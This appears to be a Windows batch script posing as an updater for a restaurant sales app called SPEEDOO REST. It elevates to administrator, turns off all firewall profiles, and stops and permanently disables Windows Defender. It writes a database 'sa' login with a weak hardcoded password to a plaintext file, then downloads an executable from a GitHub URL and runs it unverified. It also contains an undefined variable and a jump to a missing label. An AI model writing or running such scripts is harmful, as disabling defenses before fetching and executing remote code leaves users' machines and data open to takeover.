@echo off
@REM --------------------> Run Batch As Admin <--------------------
setlocal
REM check if file Run Us Admin
openfiles >nul 2>&1
if '%errorlevel%' == '0' goto main
powershell -Command "Start-Process cmd -ArgumentList '/c \"%~dp0%~nx0\"' -Verb RunAs"
exit /b
:main
REM ------------Set Firewall off
netsh advfirewall set publicprofile state off
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set allprofiles state off
netsh advfirewall set privateprofile state off
REM ------------------stop windefend
net stop windefend
Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
@REM ---------------- Varibals ------------------------
set "Shortcut_Part=SPEEDOO REST"
set "UserDesktop=%USERPROFILE%\Desktop"
set "TargetPath="
@REM ---------------- Extract speedo file path ------------------------
:serch_Shortcut
for %%F in ("%UserDesktop%\%Shortcut_Part%*.lnk") do (
    for /f "delims=" %%A in ('powershell -command "(New-Object -ComObject WScript.Shell).CreateShortcut('%%F').TargetPath"') do (
        set "FullPath=%%A"
        set "FolderPath=%%~dpA"
        goto :found
    )
)
@REM -------------------------> Prompt for path if shortcut is not found
if not defined TargetPath (
    set "Shortcut_Part=RESTAURANT_APP"
    goto serch_Shortcut
    
)
:found
if "%FolderPath:~-1%"=="\" set "FolderPath=%FolderPath:~0,-1%"
set "Update_File=C:\MySettingRESTAURANT\Update\"
mkdir %Update_File%DatabaseBackup
mkdir %Update_File%LastVersion
mkdir %Update_File%OldVersion
set   Update_Exe_Patt=%Update_File%Update_Exe
mkdir %Update_Exe_Patt%
@REM ---------------- creat Info.txt------------------------
set "InfoPath=%Update_File%Info.txt"
echo ConnectionString= Data Source=.\SALES_DEV;Initial Catalog=RESTAURANT_DB;User ID=sa;Password=12345;Integrated Security=False > "%InfoPath%"
echo Speedoo_Location= %FolderPath% >> "%InfoPath%"
echo destinationPath= C:\MySettingRESTAURANT\Update\LastVersion\SPEEDOO-REST-3.0.5.0-UPDATE.zip >> "%InfoPath%"
echo Compress_Location= C:\MySettingRESTAURANT\Update\OldVersion\ >> "%InfoPath%"
echo Db_Location= C:\MySettingRESTAURANT\Update\DatabaseBackup\ >> "%InfoPath%"
echo DATABASE_NAME= RESTAURANT_DB >> "%InfoPath%"

@REM ---------------- download UPDATE_REST.exe Update.txt Info.txt ------------------------
:download
mkdir %Update_Data_file_Path%
curl -o "%Update_File%Update.txt" "https://raw.githubusercontent.com/Iraqsoft95/rest_ubdate/refs/heads/main/Update.txt"
curl -o "%Update_Exe_Patt%\UPDATE_REST.exe" "https://raw.githubusercontent.com/Iraqsoft95/rest_ubdate/refs/heads/main/UPDATE_REST.exe"
start "" "%Update_Exe_Patt%\UPDATE_REST.exe"
start "" "%Update_Exe_Patt%"
echo Download completed.
pause
goto Ubdate_Rest

pause
